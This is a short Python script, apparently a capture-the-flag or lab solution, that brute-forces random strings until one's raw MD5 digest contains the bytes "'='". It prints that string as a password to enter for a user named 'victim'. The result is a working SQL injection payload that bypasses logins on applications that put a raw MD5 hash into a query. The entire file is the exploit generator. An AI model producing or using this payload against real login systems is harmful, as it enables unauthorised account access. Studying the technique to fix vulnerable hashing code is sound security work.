from pymd5 import md5
from random import getrandbits
import os, random, re, time
#target is specified, modify the target string in re.search to change the target
#souces https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes
#https://rosettacode.org/wiki/MD5#Python
start = time.time() #start time
while(True):
    target = "'='" #'=' was the only string to use becuase of the legnth, '||'0x31-0x39 wouldn't be reasonable
    teststr = ""
    for i in range(4):
        teststr += str(getrandbits(64))
    match = re.search(b"'='", md5(teststr).digest()) #search for matching hash
    #print(md5(teststr).hexdigest()) #test to make sure it's working
    if match:
        print("SQL to input to password:\t", teststr) #username: victim
        break
end = time.time()
print("Elapsed time:\t", end - start, "seconds") # Print time to get match
    
